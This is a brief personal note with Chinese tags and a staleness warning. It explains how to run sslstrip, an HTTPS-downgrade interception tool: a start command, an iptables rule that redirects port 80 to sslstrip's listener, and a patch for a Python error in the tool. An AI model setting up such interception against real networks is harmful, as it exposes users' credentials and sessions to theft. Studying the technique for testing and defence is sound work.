---
tags:
  - 安全
  - Linux
---

# Stripping SSL


!!! warning "文档时效性说明"
    本文为早期笔记，可能存在版本过时、命令失效、链接失效、最佳实践变化等问题。请以官方最新文档为准。

Start sslstrip

```bash
sudo sslstrip --all
```

Routing

```bash
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 \
         -j REDIRECT --to-port 10000
```

Trouble shooting

```
exceptions.AttributeError: 'int' object has no attribute 'splitlines
```

Edit `/usr/lib/python2.7/site-packages/sslstrip/ServerConnection.py`

Replace `len(data)` with `str(len(data))` in line 131.